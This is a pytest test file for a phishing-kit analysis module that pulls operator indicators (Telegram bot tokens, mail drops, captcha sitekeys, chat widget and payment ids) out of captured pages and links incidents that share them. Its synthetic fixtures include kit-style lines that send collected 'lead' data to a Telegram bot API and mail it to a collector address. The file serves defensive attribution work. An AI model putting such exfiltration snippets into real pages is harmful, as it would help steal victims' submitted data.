"""Acceptance tests for hydra/genome/kit_exfil.py (synthetic inputs only; fictional ids and .example hosts)."""

from __future__ import annotations

import json

from fixtures import _art, _synthetic_warninglists  # noqa: F401

from hydra.contracts import Incident
from hydra.entropy import build_rarity
from hydra.genome import base
from hydra.genome.kit_exfil import KIT_KINDS, inf_kit
from hydra.genome.webparse import _BUNDLES, pii_hash
from hydra.redact import redact_obj
from hydra.synapse import Thresholds, build_genome, score_pair

# A fictional, well-formed-looking Telegram bot token and a Turnstile sitekey (not a vendor test key).
FAKE_TOKEN = "987654321:AAFakeFictionalTokenValue0123456789ABCDE"
FAKE_TOKEN_SECRET = FAKE_TOKEN.split(":", 1)[1]
FAKE_CHAT = "-1001987654321"
TURNSTILE_KEY = "0x4AAAAAAABkMYinukE8nzYS"


def _ctx(settings, tmp_path):
    return base.ExtractContext(settings=settings, work_dir=tmp_path)


def _incident(root, iid, *, html=None, assets=None):
    _BUNDLES.clear()
    arts = []
    if html is not None:
        arts.append(_art(root, f"{iid}/Page.html", html.encode(), "landing_html", "text/html"))
    for rel, data in (assets or []):
        arts.append(_art(root, f"{iid}/{rel}", data, "landing_asset"))
    inc = Incident(id=iid, source="test", source_ref=iid, artifacts=[a.meta for a in arts])
    return base.ResolvedIncident(inc, arts)


def _kv(res):
    return {(g.kind, g.value) for g in res.genes}


def _dump(res):
    return [g.model_dump() for g in res.genes]


# --------------------------------------------------------------------------- 1. telegram bot token + chat id


def test_telegram_bot_and_chat_are_operator_genes_without_leaking_token(tmp_path, settings):
    html = (
        "<html><head><script>\n"
        f"var api='https://api.telegram.org/bot{FAKE_TOKEN}/sendMessage';\n"
        f"var data={{chat_id:'{FAKE_CHAT}',text:lead}};\n"
        "</script></head><body>x</body></html>"
    )
    inc = _incident(tmp_path, "tg-1", html=html)
    res = inf_kit(inc, _ctx(settings, tmp_path))
    kinds = {g.kind for g in res.genes}
    assert "exfil_telegram_bot" in kinds
    assert "exfil_telegram_botid" in kinds
    assert "exfil_telegram_chat" in kinds

    groups = {g.kind: g.dependency_group for g in res.genes}
    assert groups["exfil_telegram_bot"] == "inf:operator:exfil_telegram"
    assert groups["exfil_telegram_chat"] == "inf:operator:exfil_telegram"
    assert ("exfil_telegram_bot", pii_hash(FAKE_TOKEN)) in _kv(res)
    assert ("exfil_telegram_botid", "987654321") in _kv(res)
    assert ("exfil_telegram_chat", FAKE_CHAT) in _kv(res)

    # the raw secret token must appear nowhere in values, notes, or a redacted export of the genes
    blob = json.dumps(_dump(res))
    assert FAKE_TOKEN_SECRET not in blob
    assert FAKE_TOKEN not in blob
    assert FAKE_TOKEN_SECRET not in json.dumps(redact_obj(_dump(res)))


def test_chat_id_without_telegram_context_is_ignored(tmp_path, settings):
    # a bare chat_id-like key in generic JS (no Telegram host or token) is not accepted
    html = "<html><body><script>var cfg={chat_id:12345678};loadWidget(cfg);</script></body></html>"
    inc = _incident(tmp_path, "tg-noctx", html=html)
    res = inf_kit(inc, _ctx(settings, tmp_path))
    assert "exfil_telegram_chat" not in {g.kind for g in res.genes}


# --------------------------------------------------------------------------- 2. library path is skipped


def test_same_token_inside_vendor_path_produces_nothing(tmp_path, settings):
    payload = f"var api='https://api.telegram.org/bot{FAKE_TOKEN}/sendMessage';".encode()
    inc = _incident(tmp_path, "vendor-1", assets=[("Page_files/vendor/analytics.js", payload)])
    res = inf_kit(inc, _ctx(settings, tmp_path))
    assert not [g for g in res.genes if g.kind.startswith("exfil_")]


# --------------------------------------------------------------------------- 3. mail drop via variable


def test_mail_drop_via_one_variable_assignment(tmp_path, settings):
    php = (
        b"<?php\n$to = 'collector@gmail.com';\n"
        b"mail($to, 'Nowy lead', $body);\n"
        b"mail('admin@example.com', 'ignored placeholder', $x);\n"
        b"?>"
    )
    inc = _incident(tmp_path, "mail-1", assets=[("gate/send.php", php)])
    res = inf_kit(inc, _ctx(settings, tmp_path))
    kv = _kv(res)
    assert ("mail_drop", pii_hash("collector@gmail.com")) in kv
    assert ("mail_drop", pii_hash("admin@example.com")) not in kv
    g = next(x for x in res.genes if x.kind == "mail_drop")
    assert g.dependency_group == "inf:operator:contact"
    assert "collector@gmail.com" not in str(g.model_dump())


# --------------------------------------------------------------------------- 4. sitekey links two incidents


def _filler(root, iid):
    return _incident(root, iid, html=f"<html><body><h1>unrelated page {iid}</h1><p>{iid}</p></body></html>")


def _genome_for(inc, settings, tmp_path):
    res = inf_kit(inc, _ctx(settings, tmp_path))
    return res, build_genome(inc.incident.id, res.genes, {})


def test_shared_turnstile_sitekey_links_with_operator_bits(tmp_path, settings):
    a_html = (
        f"<html><body><h1>Inwestycja A</h1>"
        f"<div class='cf-turnstile' data-sitekey='{TURNSTILE_KEY}'></div></body></html>"
    )
    b_html = (
        f"<html><body><h2>Zysk B</h2><form>"
        f'<div class="cf-turnstile" data-sitekey="{TURNSTILE_KEY}"></div></form></body></html>'
    )
    inc_a = _incident(tmp_path, "site-a", html=a_html)
    resa, ga = _genome_for(inc_a, settings, tmp_path)
    inc_b = _incident(tmp_path, "site-b", html=b_html)
    resb, gb = _genome_for(inc_b, settings, tmp_path)

    assert ("captcha_sitekey", f"turnstile:{TURNSTILE_KEY}") in _kv(resa)
    sk = next(g for g in resa.genes if g.kind == "captcha_sitekey")
    assert sk.dependency_group == "inf:operator:captcha"

    genes_by_inc = {"site-a": resa.genes, "site-b": resb.genes}
    for i in range(6):
        f = _filler(tmp_path, f"filler-{i}")
        genes_by_inc[f.incident.id] = inf_kit(f, _ctx(settings, tmp_path)).genes
    # rebuild genomes against the shared bundle cache cleared per incident is fine (genes already captured)
    rarity = build_rarity(genes_by_inc, {})
    pe = score_pair(ga, gb, rarity, Thresholds())
    assert pe.operator_bits > 0
    assert any(r.kind == "captcha_sitekey" for r in pe.score.reasons)


def test_vendor_test_sitekey_gives_zero_bits(tmp_path, settings):
    key = "1x00000000000000000000AA"  # Turnstile always-passes (vendor test key)
    html = f"<html><body><div class='cf-turnstile' data-sitekey='{key}'></div></body></html>"
    inc_a = _incident(tmp_path, "t-a", html=html)
    resa, ga = _genome_for(inc_a, settings, tmp_path)
    inc_b = _incident(tmp_path, "t-b", html=html)
    resb, gb = _genome_for(inc_b, settings, tmp_path)

    g = next(x for x in resa.genes if x.kind == "captcha_sitekey")
    assert g.dependency_group == "inf:boilerplate:captcha_sitekey"

    genes_by_inc = {"t-a": resa.genes, "t-b": resb.genes}
    rarity = build_rarity(genes_by_inc, {})
    pe = score_pair(ga, gb, rarity, Thresholds())
    assert pe.operator_bits == 0
    assert not any(r.kind == "captcha_sitekey" for r in pe.score.reasons)


# --------------------------------------------------------------------------- 5. licence header credit ignored


def test_coded_by_in_jquery_licence_is_ignored(tmp_path, settings):
    header = (
        "/*! jQuery v3.6.0 | (c) OpenJS Foundation and other contributors | jquery.org/license\n"
        " * Permission is hereby granted, free of charge. coded by John Resig and contributors. */\n"
        "function x(){return 1;}"
    )
    html = f"<html><head><script>{header}</script></head><body>x</body></html>"
    inc = _incident(tmp_path, "lic-1", html=html)
    res = inf_kit(inc, _ctx(settings, tmp_path))
    assert "kit_author" not in {g.kind for g in res.genes}


def test_real_author_credit_is_kept(tmp_path, settings):
    html = "<html><body><!-- coded by darkpanel2024 --><h1>x</h1></body></html>"
    inc = _incident(tmp_path, "auth-1", html=html)
    res = inf_kit(inc, _ctx(settings, tmp_path))
    kv = _kv(res)
    assert ("kit_author", "darkpanel2024") in kv
    g = next(x for x in res.genes if x.kind == "kit_author")
    assert g.dependency_group == "inf:kit:author"


def test_kind_catalogue_groups_match_spec():
    assert KIT_KINDS["mail_drop"] == ("inf:operator:contact", 0.8)
    assert KIT_KINDS["captcha_sitekey"] == ("inf:operator:captcha", 0.9)
    assert KIT_KINDS["kit_author"][0] == "inf:kit:author"


# ---------------------------------------------------------------- G07: chat widgets, payment processors, ad publishers

TAWK = "5f8e1a2b3c4d5e6f7a8b9c0d"  # synthetic 24-hex property id
SK_LIVE = "sk_live_" + "x9" * 12      # synthetic Stripe secret key shape


def _pair(tmp_path, settings, a_html: str, b_html: str):
    resa, ga = _genome_for(_incident(tmp_path, "pa", html=a_html), settings, tmp_path)
    resb, gb = _genome_for(_incident(tmp_path, "pb", html=b_html), settings, tmp_path)
    genes_by_inc = {"pa": resa.genes, "pb": resb.genes}
    for i in range(6):
        f = _filler(tmp_path, f"fill-{i}")
        genes_by_inc[f.incident.id] = inf_kit(f, _ctx(settings, tmp_path)).genes
    return resa, score_pair(ga, gb, build_rarity(genes_by_inc, {}), Thresholds())


def test_shared_tawk_property_links_and_names_the_widget(tmp_path, settings):
    a = f"<html><body><h1>Sklep A</h1><script src='https://embed.tawk.to/{TAWK}/1ekvabc'></script></body></html>"
    b = f'<html><body><h2>Inny B</h2><script src="//embed.tawk.to/{TAWK}/1ekvabc" async></script></body></html>'
    resa, pe = _pair(tmp_path, settings, a, b)
    g = next(x for x in resa.genes if x.kind == "chat_widget_id")
    assert g.value == f"tawk:{TAWK}/1ekvabc" and g.dependency_group == "inf:operator:chat_widget"
    assert pe.operator_bits > 0
    line = next(r for r in pe.score.reasons if r.kind == "chat_widget_id")
    assert "tawk" in line.explanation_pl


def test_stripe_test_key_is_boilerplate_and_secret_key_redacted(tmp_path, settings):
    key = "pk_test_a1B2c3D4e5F6g7H8i9J0"
    a = f"<html><body><script>Stripe('{key}'); var s = '{SK_LIVE}';</script></body></html>"
    b = f"<html><body><p>B</p><script>Stripe('{key}')</script></body></html>"
    resa, pe = _pair(tmp_path, settings, a, b)
    g = next(x for x in resa.genes if x.kind == "payment_processor_id")
    assert g.dependency_group.startswith("inf:boilerplate:") and pe.operator_bits == 0
    assert "sk_live_" not in json.dumps(_dump(resa)) and "sk_live_" not in json.dumps(redact_obj({"v": SK_LIVE}))


def test_adsense_and_merchant_field_are_operator_ids(tmp_path, settings):
    html = ("<html><body><ins class='adsbygoogle' data-ad-client='ca-pub-7364519208371642'></ins>"
            "<form><input type='hidden' name='p24_merchant_id' value='204517'></form></body></html>")
    kv = _kv(inf_kit(_incident(tmp_path, "ads", html=html), _ctx(settings, tmp_path)))
    assert ("ad_publisher_id", "adsense:ca-pub-7364519208371642") in kv
    assert ("payment_processor_id", "merchant_field:p24_merchant_id=204517") in kv
